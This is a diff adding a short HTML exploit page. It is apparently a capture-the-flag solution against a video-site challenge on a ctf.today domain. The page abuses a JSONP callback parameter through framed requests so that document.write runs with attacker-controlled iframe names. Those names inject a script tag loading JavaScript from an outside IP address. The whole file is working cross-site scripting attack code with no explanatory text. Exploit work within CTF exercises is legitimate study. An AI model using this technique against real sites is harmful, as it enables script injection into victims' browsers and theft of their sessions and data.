@@ -1,0 +1,21 @@
+<iframe src="https://somevideos.appsecil.ctf.today/" name="x" onload="go()"></iframe>
+<iframe id="y" name="s = document.createElement('script'); s.src='http://140.113.24.143/some.js';document.head.appendChild(s);"></iframe>
+
+<script>
+function loadIframe(uid){
+    return new Promise(resolve => {
+        y.src = `https://somevideos.appsecil.ctf.today/videos/view?id=${uid}%26callback=top.x.document.write%23#debug`;
+        y.onload = function(){
+            return resolve(this);
+        }
+    });
+}
+
+async function go(){
+    await loadIframe("8c0408e7-04c5-431a-bc7c-b99dd188ddf3");
+    await loadIframe("25d979c6-8962-473e-aa4f-4a03af2df489");
+    await loadIframe("209b8396-eb53-45f6-8d17-6697bbea4182");
+    await loadIframe("03094b65-1060-426e-8902-9fb423f2489a");
+    await loadIframe("adeec907-2242-40e4-85b8-641871e62b37");
+}
+</script>
